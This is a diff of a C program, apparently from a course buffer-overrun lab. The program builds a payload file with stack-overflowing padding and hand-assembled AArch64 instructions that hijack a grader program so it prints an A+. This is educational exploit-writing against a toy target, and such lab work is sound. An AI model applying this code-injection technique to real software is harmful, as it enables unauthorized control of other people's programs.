@@ -9,15 +9,17 @@
 #include "miniassembler.h"
 
 /*
-  Produces a file called dataA with the student name, a nullbyte, 
+  Produces a file called dataAplus with the student name, a nullbyte, 
   padding to overrun the stack, with the assembly code to overwrite
-  the 'D' in data with an 'A', which causes the grade to be returned
-  to be an A
+  the 'D' in data with a '+,' which causes the grade to be returned
+  to be an A+ when combined with a prior branch-link instruction to
+  printf the character A (followed by null bytes, as printf only takes
+  strings as arguments).
 */
 
-/* Writes a file 'dataA' to influence the grader program's behavior and
-   get a A. No command-line arguments, stdin reads, or stdout/stderr 
-   writes. 
+/* Writes a file 'dataAplus' to influence the grader program's behavior 
+   and get an A+. No command-line arguments, stdin reads, or stdout/
+   stderr writes. 
 */
 
 int main(void)
@@ -53,13 +55,16 @@ int main(void)
         fputc('\0', f);
     }
 
-    /* writes the instructions to print the 'A' char to file*/
+    /* writes the instructions to print the 'A' char to file */
     movInstr = MiniAssembler_adr(0, 0x42006c, 0x420070);
     fwrite(&movInstr, sizeof(unsigned int), 1, f);
     bInstr = MiniAssembler_bl(0x400690, 0x420074);
     fwrite(&bInstr, sizeof(unsigned int), 1, f);
 
-    /* writes the instructions to print what is in main to the file */
+    /* writes the instructions to print what is in main to the file;
+    similar structure as the createdataA program, except we are 
+    replacingD in the data section with a +. The previous lines take
+    care of the 'A' in the 'A+'. */
     movInstr = MiniAssembler_mov(0, '+');
     fwrite(&movInstr, sizeof(unsigned int), 1, f);
     adrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
